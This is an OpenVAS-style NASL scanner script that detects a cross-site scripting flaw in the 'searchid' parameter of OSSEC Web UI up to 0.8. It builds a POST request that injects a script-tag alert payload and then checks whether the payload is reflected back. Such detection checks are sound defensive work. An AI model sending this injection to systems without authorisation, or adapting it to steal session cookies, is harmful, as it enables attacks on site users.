# SPDX-FileCopyrightText: 2015 SCHUTZWERK GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:ossec:ossec-wui";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111070");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2015-12-13 15:00:00 +0100 (Sun, 13 Dec 2015)");
  script_name("OSSEC Web UI 'searchid' Parameter Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"OSSEC Web UI is prone to a cross-site scripting
  vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP POST and
  check the reply.");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute
  arbitrary script code in the browser of an unsuspecting user in the context of
  the affected site. This can allow the attacker to steal cookie-based authentication
  credentials and launch other attacks.");

  script_tag(name:"affected", value:"OSSEC Web UI up to 0.8 is vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/524247");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55714");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_ossec-wui_detect.nasl");
  script_mandatory_keys("ossec-wui/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";
url = dir + "/index.php?f=s";

useragent = http_get_user_agent();
host = http_host_name( port:port );

data = 'monitoring=0&initdate=2015-12-13+11%3A57&finaldate=2015-12-13+15%3A57' +
       '&level=7&grouppattern=ALL&strpattern=&logpattern=ALL&srcippattern=&userpattern=' +
       '&locationpattern=&rulepattern=&max_alerts_per_page=1000&sea' + '\n' + # a newline is needed here
       'rch=<Search&searchid="><script>alert("XSS-Test")</script>;';
len = strlen( data );

req = 'POST ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: ' + useragent +'\r\n' +
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: en-US,en;q=0.5\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' +
      'Content-Length: ' + len + '\r\n' +
      '\r\n' +
      data;
res = http_keepalive_send_recv( port:port, data:req );

if( res && res =~ "^HTTP/1\.[01] 200" && '"><script>alert("XSS-Test")</script>;' >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
